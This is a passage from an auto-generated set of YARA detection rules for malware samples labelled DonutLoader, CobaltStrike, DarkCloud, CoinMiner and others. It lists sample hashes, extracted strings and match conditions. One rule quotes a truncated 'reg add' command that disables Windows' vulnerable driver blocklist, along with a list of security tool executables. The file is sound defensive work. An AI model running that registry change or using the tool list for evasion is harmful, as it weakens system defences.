      hash2 = "f234f9b798ad23cb4bafca43e166a651ae2bb52bd7df8b004ebb163f0a87cbfd"
      hash3 = "a34acd47127196ab867d572c2c6cf2fcccffa3a7a87e82d338a8efed898ca722"
      hash4 = "da2e0c0fcb8accb823745b294de378f99bcfa6fc9856ee21f1ad46bceef1f0ec"
      hash5 = "da06a1fea03a65303b4dd9e7cc4337a127ad450d07bb7939de6c2e27a0cb23b5"
      hash6 = "93a76dcb046672ce458a272400fdc8040942c1dd8605ed7b81bc98fcca3b5e1b"
      hash7 = "e689afee5f7bdbd1613bd9a3915ef2a185a05c72aaae4df3dee988fa7109cb0b"
      hash8 = "f2bbba1ea0f34b262f158ff31e00d39d89bbc471d04e8fca60a034cabe18e4f4"
   strings:
      $s1 = "strconv.computeBounds" fullword ascii /* score: '14.00'*/
      $s2 = "reflect.Value.Complex" fullword ascii /* score: '14.00'*/
      $s3 = "runtime.mapassign_fast64ptr" fullword ascii /* score: '13.00'*/
      $s4 = "sync.(*Pool).Get" fullword ascii /* score: '12.00'*/
      $s5 = "strconv.mulByLog10Log2" fullword ascii /* score: '12.00'*/
      $s6 = "strconv.mulByLog2Log10" fullword ascii /* score: '12.00'*/
      $s7 = "fmt.getField" fullword ascii /* score: '12.00'*/
      $s8 = "internal/fmtsort.compare" fullword ascii /* score: '11.00'*/
      $s9 = "erroring" fullword ascii /* score: '11.00'*/
      $s10 = "reflect.(*MapIter).Key" fullword ascii /* score: '10.00'*/
      $s11 = "reflect.add" fullword ascii /* score: '10.00'*/
      $s12 = "reflect.Value.Int" fullword ascii /* score: '10.00'*/
      $s13 = "strconv.AppendQuoteRuneToASCII" fullword ascii /* score: '10.00'*/
      $s14 = "strconv.appendQuotedRuneWith" fullword ascii /* score: '10.00'*/
      $s15 = "reflect.Value.Len" fullword ascii /* score: '10.00'*/
   condition:
      ( ( uint16(0) == 0x5a4d or uint16(0) == 0x457f ) and filesize < 24000KB and ( 8 of them )
      ) or ( all of them )
}

rule _da06a1fea03a65303b4dd9e7cc4337a127ad450d07bb7939de6c2e27a0cb23b5_da06a1fe_DonutLoader_signature__d42595b695fc008ef2c56aabd8_34 {
   meta:
      description = "_subset_batch - from files da06a1fea03a65303b4dd9e7cc4337a127ad450d07bb7939de6c2e27a0cb23b5_da06a1fe.elf, DonutLoader(signature)_d42595b695fc008ef2c56aabd8efd68e(imphash).exe, e689afee5f7bdbd1613bd9a3915ef2a185a05c72aaae4df3dee988fa7109cb0b_e689afee.elf, f2bbba1ea0f34b262f158ff31e00d39d89bbc471d04e8fca60a034cabe18e4f4_f2bbba1e.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "da06a1fea03a65303b4dd9e7cc4337a127ad450d07bb7939de6c2e27a0cb23b5"
      hash2 = "93a76dcb046672ce458a272400fdc8040942c1dd8605ed7b81bc98fcca3b5e1b"
      hash3 = "e689afee5f7bdbd1613bd9a3915ef2a185a05c72aaae4df3dee988fa7109cb0b"
      hash4 = "f2bbba1ea0f34b262f158ff31e00d39d89bbc471d04e8fca60a034cabe18e4f4"
   strings:
      $s1 = "log.(*Logger).SetFlags" fullword ascii /* score: '14.00'*/
      $s2 = "log.(*Logger).Output" fullword ascii /* score: '14.00'*/
      $s3 = "log.(*Logger).Output.func1" fullword ascii /* score: '14.00'*/
      $s4 = "bytes.Compare" fullword ascii /* score: '14.00'*/
      $s5 = "crypto.Hash.New" fullword ascii /* score: '13.00'*/
      $s6 = "crypto/ecdsa.(*PublicKey).Add" fullword ascii /* score: '13.00'*/
      $s7 = "crypto/ecdh.(*PrivateKey).PublicKey" fullword ascii /* score: '13.00'*/
      $s8 = "crypto/ecdsa.PublicKey.Add" fullword ascii /* score: '13.00'*/
      $s9 = "internal/bytealg.Compare" fullword ascii /* score: '11.00'*/
      $s10 = "sync.runtime_notifyListNotifyOne" fullword ascii /* score: '10.00'*/
      $s11 = "runtime.less" fullword ascii /* score: '10.00'*/
      $s12 = "crypto/rc4.(*KeySizeError).Error" fullword ascii /* score: '10.00'*/
      $s13 = "sync.runtime_notifyListNotifyAll" fullword ascii /* score: '10.00'*/
      $s14 = "crypto/des.(*KeySizeError).Error" fullword ascii /* score: '10.00'*/
      $s15 = "*rc4.KeySizeError" fullword ascii /* score: '10.00'*/
   condition:
      ( ( uint16(0) == 0x457f or uint16(0) == 0x5a4d ) and filesize < 24000KB and pe.imphash() == "d42595b695fc008ef2c56aabd8efd68e" and ( 8 of them )
      ) or ( all of them )
}

rule _Cephalus_signature__d42595b695fc008ef2c56aabd8efd68e_imphash__CobaltStrike_signature__f0ea7b7844bbc5bfa9bb32efdcea957c_imph_35 {
   meta:
      description = "_subset_batch - from files Cephalus(signature)_d42595b695fc008ef2c56aabd8efd68e(imphash).exe, CobaltStrike(signature)_f0ea7b7844bbc5bfa9bb32efdcea957c(imphash).exe, d42595b695fc008ef2c56aabd8efd68e(imphash)_691c1d6c.exe, da06a1fea03a65303b4dd9e7cc4337a127ad450d07bb7939de6c2e27a0cb23b5_da06a1fe.elf, DonutLoader(signature)_d42595b695fc008ef2c56aabd8efd68e(imphash).exe, e689afee5f7bdbd1613bd9a3915ef2a185a05c72aaae4df3dee988fa7109cb0b_e689afee.elf, f2bbba1ea0f34b262f158ff31e00d39d89bbc471d04e8fca60a034cabe18e4f4_f2bbba1e.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "a34acd47127196ab867d572c2c6cf2fcccffa3a7a87e82d338a8efed898ca722"
      hash2 = "da2e0c0fcb8accb823745b294de378f99bcfa6fc9856ee21f1ad46bceef1f0ec"
      hash3 = "691c1d6c02c0153bdfaf6fb31506cd3aced24ed9902747c39fa6ac2094c202f1"
      hash4 = "da06a1fea03a65303b4dd9e7cc4337a127ad450d07bb7939de6c2e27a0cb23b5"
      hash5 = "93a76dcb046672ce458a272400fdc8040942c1dd8605ed7b81bc98fcca3b5e1b"
      hash6 = "e689afee5f7bdbd1613bd9a3915ef2a185a05c72aaae4df3dee988fa7109cb0b"
      hash7 = "f2bbba1ea0f34b262f158ff31e00d39d89bbc471d04e8fca60a034cabe18e4f4"
   strings:
      $s1 = "runtime.waitReason.isMutexWait" fullword ascii /* score: '21.00'*/
      $s2 = "internal/testlog.Logger" fullword ascii /* score: '18.00'*/
      $s3 = "runtime.(*stkframe).getStackMap" fullword ascii /* score: '15.00'*/
      $s4 = "runtime.gfget.func2" fullword ascii /* score: '15.00'*/
      $s5 = "runtime.(*activeSweep).end" fullword ascii /* score: '15.00'*/
      $s6 = "runtime.gcPaceSweeper" fullword ascii /* score: '15.00'*/
      $s7 = "runtime.pidlegetSpinning" fullword ascii /* score: '15.00'*/
      $s8 = "isMutexWait" fullword ascii /* score: '15.00'*/
      $s9 = "runtime.sysFaultOS" fullword ascii /* score: '14.00'*/
      $s10 = "internal/testlog.Getenv" fullword ascii /* score: '14.00'*/
      $s11 = "runtime.sysAllocOS" fullword ascii /* score: '14.00'*/
      $s12 = "runtime.sysUnusedOS" fullword ascii /* score: '14.00'*/
      $s13 = "runtime.sysReserveOS" fullword ascii /* score: '14.00'*/
      $s14 = "targetCPUFraction" fullword ascii /* score: '14.00'*/
      $s15 = "runtime.sysFreeOS" fullword ascii /* score: '14.00'*/
   condition:
      ( ( uint16(0) == 0x5a4d or uint16(0) == 0x457f ) and filesize < 24000KB and ( 8 of them )
      ) or ( all of them )
}

rule _DonutLoader_signature__d42595b695fc008ef2c56aabd8efd68e_imphash__e689afee5f7bdbd1613bd9a3915ef2a185a05c72aaae4df3dee988fa71_36 {
   meta:
      description = "_subset_batch - from files DonutLoader(signature)_d42595b695fc008ef2c56aabd8efd68e(imphash).exe, e689afee5f7bdbd1613bd9a3915ef2a185a05c72aaae4df3dee988fa7109cb0b_e689afee.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "93a76dcb046672ce458a272400fdc8040942c1dd8605ed7b81bc98fcca3b5e1b"
      hash2 = "e689afee5f7bdbd1613bd9a3915ef2a185a05c72aaae4df3dee988fa7109cb0b"
   strings:
      $s1 = "vendor/golang.org/x/sys/cpu.processOptions" fullword ascii /* score: '18.00'*/
      $s2 = "runtime.getAuxv" fullword ascii /* score: '15.00'*/
      $s3 = "crypto/internal/fips140/aes.EncryptionKeySchedule" fullword ascii /* score: '12.00'*/
      $s4 = "vendor/golang.org/x/sys/cpu.xgetbv" fullword ascii /* score: '12.00'*/
      $s5 = "ransport" fullword ascii /* score: '11.00'*/
      $s6 = "strconv.readFloat" fullword ascii /* score: '10.00'*/
      $s7 = "sfy MinVersion and MaxVersiontls: initial handshake had non-empty renegotiation extensiontls: server resumed a session with a di" ascii /* score: '10.00'*/
      $s8 = "math.NaN" fullword ascii /* score: '10.00'*/
      $s9 = "strconv.commonPrefixLenIgnoreCase" fullword ascii /* score: '10.00'*/
      $s10 = "(3'((!'3(" fullword ascii /* score: '9.00'*/ /* hex encoded string '3' */
      $s11 = "8POSTt!" fullword ascii /* score: '9.00'*/
      $s12 = ">HEADt!H" fullword ascii /* score: '9.00'*/
      $s13 = ">HEADuNH" fullword ascii /* score: '9.00'*/
      $s14 = "Content-H9" fullword ascii /* score: '9.00'*/
      $s15 = "AuthorizH9" fullword ascii /* score: '8.00'*/
   condition:
      ( ( uint16(0) == 0x5a4d or uint16(0) == 0x457f ) and filesize < 24000KB and pe.imphash() == "d42595b695fc008ef2c56aabd8efd68e" and ( 8 of them )
      ) or ( all of them )
}

rule _DarkCloud_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__989abbc4_DarkCloud_signature__f34d5f2d4577ed6d9ceec516c1f5a7_37 {
   meta:
      description = "_subset_batch - from files DarkCloud(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_989abbc4.exe, DarkCloud(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_9d868f31.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "989abbc447fdf6d9082210d06760f3705c6f07b4020375b78640248fe5b49d14"
      hash2 = "9d868f31c6cc17e3c71942f41008ac4e91c9141f2a48570cde35dea5efc5115a"
   strings:
      $s1 = "Unit Converter - Conversion History Report" fullword wide /* score: '20.00'*/
      $s2 = "Conversion History - Unit Converter" fullword wide /* score: '17.00'*/
      $s3 = "GetUnitDescription" fullword ascii /* score: '15.00'*/
      $s4 = "Unsupported file format. Use .csv or .txt" fullword wide /* score: '14.00'*/
      $s5 = "Settings - Unit Converter" fullword wide /* score: '14.00'*/
      $s6 = "ConversionHistory_{0:yyyyMMdd}.csv" fullword wide /* score: '13.00'*/
      $s7 = "GetMostUsedConversions" fullword ascii /* score: '12.00'*/
      $s8 = "<GetMostUsedConversions>b__20_2" fullword ascii /* score: '12.00'*/
      $s9 = "GetConversions" fullword ascii /* score: '12.00'*/
      $s10 = "<GetMostUsedConversions>b__20_1" fullword ascii /* score: '12.00'*/
      $s11 = "<GetMostUsedConversions>b__20_0" fullword ascii /* score: '12.00'*/
      $s12 = "GetRecentConversions" fullword ascii /* score: '12.00'*/
      $s13 = "Export Conversion History" fullword wide /* score: '12.00'*/
      $s14 = "ConvertTemperature" fullword ascii /* score: '11.00'*/
      $s15 = "Kilogram" fullword wide /* score: '11.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 3000KB and pe.imphash() == "f34d5f2d4577ed6d9ceec516c1f5a744" and ( 8 of them )
      ) or ( all of them )
}

rule _DarkCloud_signature__DarkCloud_signature__e1fc2f03_38 {
   meta:
      description = "_subset_batch - from files DarkCloud(signature).vbs, DarkCloud(signature)_e1fc2f03.vbs"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "829c252a4c01f72b2f015d5d2990278518c64838dc1ec5efe395e3bdaf139892"
      hash2 = "e1fc2f034a2afc3aaca14122ada80071c3a0fc9cb53e52f9b1b73f4c966342cc"
   strings:
      $s1 = "    FailRemoteExec()" fullword ascii /* score: '17.00'*/
      $s2 = "            ADGetIID WScript.Arguments.Item(index+1)" fullword ascii /* score: '10.00'*/
      $s3 = "        \"ProcessorURL, MachineURL, UseLicenseURL, ProductKeyURL, ValidationURL, \" & _" fullword ascii /* score: '10.00'*/
      $s4 = "    ' VBScript only supports Int truncation or 'evens' rounding, it does not support a CEILING/FLOOR operation or MOD" fullword ascii /* score: '9.00'*/
      $s5 = "            ClearKmsLookupDomain WScript.Arguments.Item(index+1)" fullword ascii /* score: '8.00'*/
      $s6 = "            InstallProductKey WScript.Arguments.Item(index+1)" fullword ascii /* score: '8.00'*/
      $s7 = "                SetKmsLookupDomain WScript.Arguments.Item(index+1), WScript.Arguments.Item(index+2)" fullword ascii /* score: '8.00'*/
      $s8 = "            UninstallProductKey WScript.Arguments.Item(index+1)" fullword ascii /* score: '8.00'*/
      $s9 = "                SetKmsLookupDomain WScript.Arguments.Item(index+1), \"\"" fullword ascii /* score: '8.00'*/
      $s10 = "            SetKmsListenPort WScript.Arguments.Item(index+1)" fullword ascii /* score: '8.00'*/
   condition:
      ( uint16(0) == 0x0d27 and filesize < 400KB and ( all of them )
      ) or ( all of them )
}

rule _da06a1fea03a65303b4dd9e7cc4337a127ad450d07bb7939de6c2e27a0cb23b5_da06a1fe_e689afee5f7bdbd1613bd9a3915ef2a185a05c72aaae4df3d_39 {
   meta:
      description = "_subset_batch - from files da06a1fea03a65303b4dd9e7cc4337a127ad450d07bb7939de6c2e27a0cb23b5_da06a1fe.elf, e689afee5f7bdbd1613bd9a3915ef2a185a05c72aaae4df3dee988fa7109cb0b_e689afee.elf, f2bbba1ea0f34b262f158ff31e00d39d89bbc471d04e8fca60a034cabe18e4f4_f2bbba1e.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "da06a1fea03a65303b4dd9e7cc4337a127ad450d07bb7939de6c2e27a0cb23b5"
      hash2 = "e689afee5f7bdbd1613bd9a3915ef2a185a05c72aaae4df3dee988fa7109cb0b"
      hash3 = "f2bbba1ea0f34b262f158ff31e00d39d89bbc471d04e8fca60a034cabe18e4f4"
   strings:
      $s1 = "runtime.sigpipe" fullword ascii /* score: '16.00'*/
      $s2 = "runtime.getsig" fullword ascii /* score: '15.00'*/
      $s3 = "runtime.gettid" fullword ascii /* score: '15.00'*/
      $s4 = "internal/poll.getPipe" fullword ascii /* score: '15.00'*/
      $s5 = "runtime.sched_getaffinity" fullword ascii /* score: '15.00'*/
      $s6 = "net.maxListenerBacklog" fullword ascii /* score: '15.00'*/
      $s7 = "runtime.getpid" fullword ascii /* score: '15.00'*/
      $s8 = "runtime.getHugePageSize" fullword ascii /* score: '15.00'*/
      $s9 = "runtime.getGodebugEarly" fullword ascii /* score: '15.00'*/
      $s10 = "runtime.sysargs" fullword ascii /* score: '14.00'*/
      $s11 = "runtime.sysSigaction.func1" fullword ascii /* score: '14.00'*/
      $s12 = "runtime.sysSigaction" fullword ascii /* score: '14.00'*/
      $s13 = "runtime.sysMapOS" fullword ascii /* score: '14.00'*/
      $s14 = "runtime.sysauxv" fullword ascii /* score: '14.00'*/
      $s15 = "runtime.sysHugePageOS" fullword ascii /* score: '14.00'*/
   condition:
      ( uint16(0) == 0x457f and filesize < 24000KB and ( 8 of them )
      ) or ( all of them )
}

rule _db68ae24be2c0ba7ff4de9c812fa34b4_imphash__db68ae24be2c0ba7ff4de9c812fa34b4_imphash__a707d4ff_40 {
   meta:
      description = "_subset_batch - from files db68ae24be2c0ba7ff4de9c812fa34b4(imphash).exe, db68ae24be2c0ba7ff4de9c812fa34b4(imphash)_a707d4ff.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "6bc47219bbaa0e71a45b980af8a948d933b042bd84fb3a02add1919eb7e63e24"
      hash2 = "a707d4ff236664da437e1a84c40c36a3434b3a63f38643c6393e05d95b0f6924"
   strings:
      $x1 = "processhacker.exe" fullword ascii /* score: '33.00'*/
      $x2 = "tcpdump.exe" fullword ascii /* score: '32.00'*/
      $x3 = "metasploit.exe" fullword ascii /* score: '31.00'*/
      $s4 = "sniffpass.exe" fullword ascii /* score: '30.00'*/
      $s5 = "disable_vulnerable_driver_blocklist = 'reg add \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\CI\\Config\" /v \"VulnerableDriverBlo" ascii /* score: '30.00'*/
      $s6 = "disable_vulnerable_driver_blocklist = 'reg add \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\CI\\Config\" /v \"VulnerableDriverBlo" ascii /* score: '30.00'*/
      $s7 = "raw.githubusercontent.com" fullword wide /* score: '29.00'*/
      $s8 = "dumpcap.exe" fullword ascii /* score: '28.00'*/
      $s9 = "exploitpack.exe" fullword ascii /* score: '26.00'*/
      $s10 = "searchsploit.exe" fullword ascii /* score: '26.00'*/
      $s11 = "httptunnel.exe" fullword ascii /* score: '25.00'*/
      $s12 = "binwalk.exe" fullword ascii /* score: '25.00'*/
      $s13 = "crunch.exe" fullword ascii /* score: '25.00'*/
      $s14 = "processhacker" fullword ascii /* PEStudio Blacklist: strings */ /* score: '24.00'*/
      $s15 = "aircrack-ng.exe" fullword ascii /* score: '24.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 1000KB and pe.imphash() == "db68ae24be2c0ba7ff4de9c812fa34b4" and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _CobaltStrike_signature__f0ea7b7844bbc5bfa9bb32efdcea957c_imphash__f2bbba1ea0f34b262f158ff31e00d39d89bbc471d04e8fca60a034cab_41 {
   meta:
      description = "_subset_batch - from files CobaltStrike(signature)_f0ea7b7844bbc5bfa9bb32efdcea957c(imphash).exe, f2bbba1ea0f34b262f158ff31e00d39d89bbc471d04e8fca60a034cabe18e4f4_f2bbba1e.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "da2e0c0fcb8accb823745b294de378f99bcfa6fc9856ee21f1ad46bceef1f0ec"
      hash2 = "f2bbba1ea0f34b262f158ff31e00d39d89bbc471d04e8fca60a034cabe18e4f4"
   strings:
      $s1 = "insufficient data for resource body lengthnon-empty mark queue after concurrent markon a locked thread with no template threadou" ascii /* score: '14.00'*/
      $s2 = "runtime/internal/atomic.(*Uint64).CompareAndSwap" fullword ascii /* score: '14.00'*/
      $s3 = "runtime/internal/atomic.(*UnsafePointer).CompareAndSwapNoWB" fullword ascii /* score: '14.00'*/
      $s4 = "runtime/internal/atomic.(*Int64).CompareAndSwap" fullword ascii /* score: '14.00'*/
      $s5 = "runtime/internal/atomic.(*Int32).CompareAndSwap" fullword ascii /* score: '14.00'*/
      $s6 = "runtime/internal/atomic.(*Uint32).CompareAndSwap" fullword ascii /* score: '14.00'*/
      $s7 = "runtime/internal/atomic.(*Uintptr).CompareAndSwap" fullword ascii /* score: '14.00'*/
      $s8 = " preemptoff= s.elemsize= s.sweepgen= span.limit= span.state= sysmonwait= wbuf1=<nil> wbuf2=<nil>) p->status=, cons/mark -byte li" ascii /* score: '13.00'*/
      $s9 = "runtime.writeHeapBits.pad" fullword ascii /* score: '13.00'*/
      $s10 = " preemptoff= s.elemsize= s.sweepgen= span.limit= span.state= sysmonwait= wbuf1=<nil> wbuf2=<nil>) p->status=, cons/mark -byte li" ascii /* score: '13.00'*/
      $s11 = "*[]net.hostLookupOrder" fullword ascii /* score: '12.00'*/
      $s12 = "*[8]net.hostLookupOrder" fullword ascii /* score: '12.00'*/
      $s13 = "*runtime.pageTraceBuf" fullword ascii /* score: '12.00'*/
      $s14 = "&*map.bucket[net.hostLookupOrder]string" fullword ascii /* score: '12.00'*/
      $s15 = "C:/Program Files/Go/src/os/tempfile.go" fullword ascii /* score: '11.00'*/
   condition:
      ( ( uint16(0) == 0x5a4d or uint16(0) == 0x457f ) and filesize < 10000KB and pe.imphash() == "f0ea7b7844bbc5bfa9bb32efdcea957c" and ( 8 of them )
      ) or ( all of them )
}

rule _Cephalus_signature__d42595b695fc008ef2c56aabd8efd68e_imphash__DonutLoader_signature__d42595b695fc008ef2c56aabd8efd68e_impha_42 {
   meta:
      description = "_subset_batch - from files Cephalus(signature)_d42595b695fc008ef2c56aabd8efd68e(imphash).exe, DonutLoader(signature)_d42595b695fc008ef2c56aabd8efd68e(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "a34acd47127196ab867d572c2c6cf2fcccffa3a7a87e82d338a8efed898ca722"
      hash2 = "93a76dcb046672ce458a272400fdc8040942c1dd8605ed7b81bc98fcca3b5e1b"
   strings:
      $s1 = "internal/sync/mutex.go" fullword ascii /* score: '15.00'*/
      $s2 = "sync/rwmutex.go" fullword ascii /* score: '15.00'*/
      $s3 = "1*[8]struct { key x509.ExtKeyUsage; elem []uint8 }" fullword ascii /* score: '12.00'*/
      $s4 = "#*map.group[x509.ExtKeyUsage][]uint8" fullword ascii /* score: '12.00'*/
      $s5 = "*map[x509.ExtKeyUsage][]uint8" fullword ascii /* score: '12.00'*/
      $s6 = ".*struct { key x509.ExtKeyUsage; elem []uint8 }" fullword ascii /* score: '12.00'*/
      $s7 = "0*[]struct { key x509.ExtKeyUsage; elem []uint8 }" fullword ascii /* score: '12.00'*/
      $s8 = "internal/syscall/windows.ProcessPrng" fullword ascii /* score: '11.00'*/
      $s9 = "runtime/stkframe.go" fullword ascii /* score: '10.00'*/
      $s10 = "runtime/symtabinl.go" fullword ascii /* score: '10.00'*/
      $s11 = "math/log.go" fullword ascii /* score: '9.00'*/
      $s12 = "math/log_amd64.s" fullword ascii /* score: '9.00'*/
      $s13 = "math/log10.go" fullword ascii /* score: '9.00'*/
      $s14 = "internal/testlog/exit.go" fullword ascii /* score: '9.00'*/
      $s15 = "internal/testlog/log.go" fullword ascii /* score: '9.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 17000KB and pe.imphash() == "d42595b695fc008ef2c56aabd8efd68e" and ( 8 of them )
      ) or ( all of them )
}

rule _cdb0a360cca7a5099c2d2357be1a833e032ffdeb3f467a6fac845f6bb77031c9_cdb0a360_df875748170a5e5cf55bd12dfdc70ae68bd91219b0d4bd71b_43 {
   meta:
      description = "_subset_batch - from files cdb0a360cca7a5099c2d2357be1a833e032ffdeb3f467a6fac845f6bb77031c9_cdb0a360.exe, df875748170a5e5cf55bd12dfdc70ae68bd91219b0d4bd71b4320fb095cbe3b3_df875748.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "cdb0a360cca7a5099c2d2357be1a833e032ffdeb3f467a6fac845f6bb77031c9"
      hash2 = "df875748170a5e5cf55bd12dfdc70ae68bd91219b0d4bd71b4320fb095cbe3b3"
   strings:
      $x1 = "costura.system.numerics.vectors.dll.compressed|4.1.4.0|System.Numerics.Vectors, Version=4.1.4.0, Culture=neutral, PublicKeyToken" ascii /* score: '44.00'*/
      $x2 = "costura.system.buffers.dll.compressed|4.0.3.0|System.Buffers, Version=4.0.3.0, Culture=neutral, PublicKeyToken=cc7b13ffcd2ddd51|" ascii /* score: '44.00'*/
      $x3 = "costura.system.memory.dll.compressed|4.0.1.2|System.Memory, Version=4.0.1.2, Culture=neutral, PublicKeyToken=cc7b13ffcd2ddd51|Sy" ascii /* score: '44.00'*/
      $x4 = "costura.system.buffers.dll.compressed|4.0.3.0|System.Buffers, Version=4.0.3.0, Culture=neutral, PublicKeyToken=cc7b13ffcd2ddd51|" ascii /* score: '42.00'*/
      $x5 = "costura.system.numerics.vectors.dll.compressed|4.1.4.0|System.Numerics.Vectors, Version=4.1.4.0, Culture=neutral, PublicKeyToken" ascii /* score: '42.00'*/
      $x6 = "costura.system.memory.dll.compressed|4.0.1.2|System.Memory, Version=4.0.1.2, Culture=neutral, PublicKeyToken=cc7b13ffcd2ddd51|Sy" ascii /* score: '42.00'*/
      $x7 = "costura.costura.dll.compressed|5.7.0.0|Costura, Version=5.7.0.0, Culture=neutral, PublicKeyToken=null|Costura.dll|F1F25C01F6ACF3" ascii /* score: '41.00'*/
      $x8 = "costura.system.runtime.compilerservices.unsafe.dll.compressed|6.0.0.0|System.Runtime.CompilerServices.Unsafe, Version=6.0.0.0, C" ascii /* score: '40.00'*/
      $x9 = "costura.costura.dll.compressed|5.7.0.0|Costura, Version=5.7.0.0, Culture=neutral, PublicKeyToken=null|Costura.dll|F1F25C01F6ACF3" ascii /* score: '39.00'*/
      $x10 = "costura.system.runtime.compilerservices.unsafe.dll.compressed|6.0.0.0|System.Runtime.CompilerServices.Unsafe, Version=6.0.0.0, C" ascii /* score: '36.00'*/
      $s11 = "ulture=neutral, PublicKeyToken=b03f5f7f11d50a3a|System.Runtime.CompilerServices.Unsafe.dll|180A7BAAFBC820A838BBACA434032D9D33CCE" ascii /* score: '27.00'*/
      $s12 = "costura.system.diagnostics.diagnosticsource.dll.compressed" fullword wide /* score: '25.00'*/
      $s13 = "System.Buffers.dll|2F410A0396BC148ED533AD49B6415FB58DD4D641|20856" fullword ascii /* score: '24.00'*/
      $s14 = "=b03f5f7f11d50a3a|System.Numerics.Vectors.dll|3D216458740AD5CB05BC5F7C3491CDE44A1E5DF0|115856" fullword ascii /* score: '21.00'*/
      $s15 = "stem.Memory.dll|3C5C5DF5F8F8DB3F0A35C5ED8D357313A54E3CDE|142240" fullword ascii /* score: '21.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 16000KB and pe.imphash() == "f34d5f2d4577ed6d9ceec516c1f5a744" and ( 1 of ($x*) and all of them )
      ) or ( all of them )
}

rule _c990338f8145dc29c6f38fb73cf05c77_imphash__c990338f8145dc29c6f38fb73cf05c77_imphash__3ba9d2ec_CoinMiner_signature__c990338f8_44 {
   meta:
      description = "_subset_batch - from files c990338f8145dc29c6f38fb73cf05c77(imphash).exe, c990338f8145dc29c6f38fb73cf05c77(imphash)_3ba9d2ec.exe, CoinMiner(signature)_c990338f8145dc29c6f38fb73cf05c77(imphash).exe, DiskWriter(signature)_351592d5ead6df0859b0cc0056827c95(imphash).exe, DiskWriter(signature)_351592d5ead6df0859b0cc0056827c95(imphash)_3e05d05b.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "ef0424546a8f3db2f9ab413a0fa30e5a2dc6e5dcb504abab97b51579a76a0c61"
      hash2 = "3ba9d2ecc5764276c2d8d4cae3ba2eeaade6b2225105aea2172b308c59b224b6"
      hash3 = "4ff9f470c13a5061dfc526fe951629cd790430713938a7f7ae582f478982d2df"
      hash4 = "f41a9a7212a4869ec3584536e24fc1db7ad94ada6f1da55bb08e07a1f9aa39da"
      hash5 = "3e05d05b027d98f43fbe2d1ba30b8d67edf10db3775574a672bbafc02c3031f5"
   strings:
      $s1 = "      <assemblyIdentity type=\"win32\" name=\"Microsoft.Windows.Common-Controls\" version=\"6.0.0.0\" processorArchitecture=\"*" ascii /* score: '27.00'*/
      $s2 = "VCRUNTIME140.dll" fullword wide /* score: '26.00'*/
      $s3 = "      <assemblyIdentity type=\"win32\" name=\"Microsoft.Windows.Common-Controls\" version=\"6.0.0.0\" processorArchitecture=\"*" ascii /* score: '24.00'*/
      $s4 = "VCRUNTIME140_1.dll" fullword wide /* score: '23.00'*/
      $s5 = "Failed to extract %s: failed to open target file!" fullword ascii /* score: '22.50'*/
      $s6 = "LOADER: failed to convert runtime-tmpdir to a wide string." fullword wide /* score: '22.00'*/
      $s7 = "LOADER: failed to expand environment variables in the runtime-tmpdir." fullword wide /* score: '22.00'*/
      $s8 = "LOADER: runtime-tmpdir points to non-existent drive %ls (type: %d)!" fullword wide /* score: '22.00'*/
      $s9 = "LOADER: failed to obtain the absolute path of the runtime-tmpdir." fullword wide /* score: '22.00'*/
      $s10 = "LOADER: failed to create runtime-tmpdir path %ls!" fullword wide /* score: '22.00'*/
      $s11 = "%s%c%s.exe" fullword ascii /* score: '20.00'*/
      $s12 = "Failed to initialize security descriptor for temporary directory!" fullword ascii /* score: '20.00'*/
      $s13 = "%ls\\ucrtbase.dll" fullword wide /* score: '20.00'*/
      $s14 = "Path of ucrtbase.dll (%ls) and its name exceed buffer size (%d)." fullword wide /* score: '19.00'*/
      $s15 = "LOADER: failed to set the TMP environment variable." fullword wide /* score: '19.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 31000KB and ( 8 of them )
      ) or ( all of them )
}

rule _d42595b695fc008ef2c56aabd8efd68e_imphash__691c1d6c_da06a1fea03a65303b4dd9e7cc4337a127ad450d07bb7939de6c2e27a0cb23b5_da06a1f_45 {
   meta:
      description = "_subset_batch - from files d42595b695fc008ef2c56aabd8efd68e(imphash)_691c1d6c.exe, da06a1fea03a65303b4dd9e7cc4337a127ad450d07bb7939de6c2e27a0cb23b5_da06a1fe.elf, DonutLoader(signature)_d42595b695fc008ef2c56aabd8efd68e(imphash).exe, e689afee5f7bdbd1613bd9a3915ef2a185a05c72aaae4df3dee988fa7109cb0b_e689afee.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "691c1d6c02c0153bdfaf6fb31506cd3aced24ed9902747c39fa6ac2094c202f1"
      hash2 = "da06a1fea03a65303b4dd9e7cc4337a127ad450d07bb7939de6c2e27a0cb23b5"
      hash3 = "93a76dcb046672ce458a272400fdc8040942c1dd8605ed7b81bc98fcca3b5e1b"
      hash4 = "e689afee5f7bdbd1613bd9a3915ef2a185a05c72aaae4df3dee988fa7109cb0b"
   strings:
      $s1 = "sync/atomic.(*Pointer[go.shape.struct { net.servers []string; net.search []string; net.ndots int; net.timeout time.Duration; net" ascii /* score: '20.00'*/
      $s2 = ".attempts int; net.rotate bool; net.unknownOpt bool; net.lookup []string; net.err error; net.mtime time.Time; net.soffset uint32" ascii /* score: '20.00'*/
